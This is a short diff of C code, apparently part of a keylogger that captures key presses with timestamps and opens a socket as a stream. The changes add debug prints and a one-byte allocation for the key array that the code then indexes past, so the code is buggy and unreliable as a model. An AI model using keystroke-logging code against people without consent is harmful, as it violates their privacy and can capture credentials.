@@ -36,8 +36,10 @@ int main(void) {
   if (socket_file == NULL) {
     error_and_exit("Couldn't open socket as file stream.");
   }
+
   key_package pack;
   pack.keys_arr_size = 0;
+  pack.keys = malloc(sizeof(char));
   key_package* package = &pack;
 
   log_device(package);
@@ -99,11 +101,13 @@ int main(void) {
               .timestamp = asctime(timeinfo)};
 
           // append to key_package->keys
+          printf("package->keys[package->keys_arr_size]: %s\n", package->keys[0]);
           package->keys[package->keys_arr_size] = pressed_key;
           package->keys_arr_size++;
 
           // printf("New key_package array size: %ld\n",
           // key_package->keys_arr_size);
+          printf("2\n");
         }
       }
     } else {
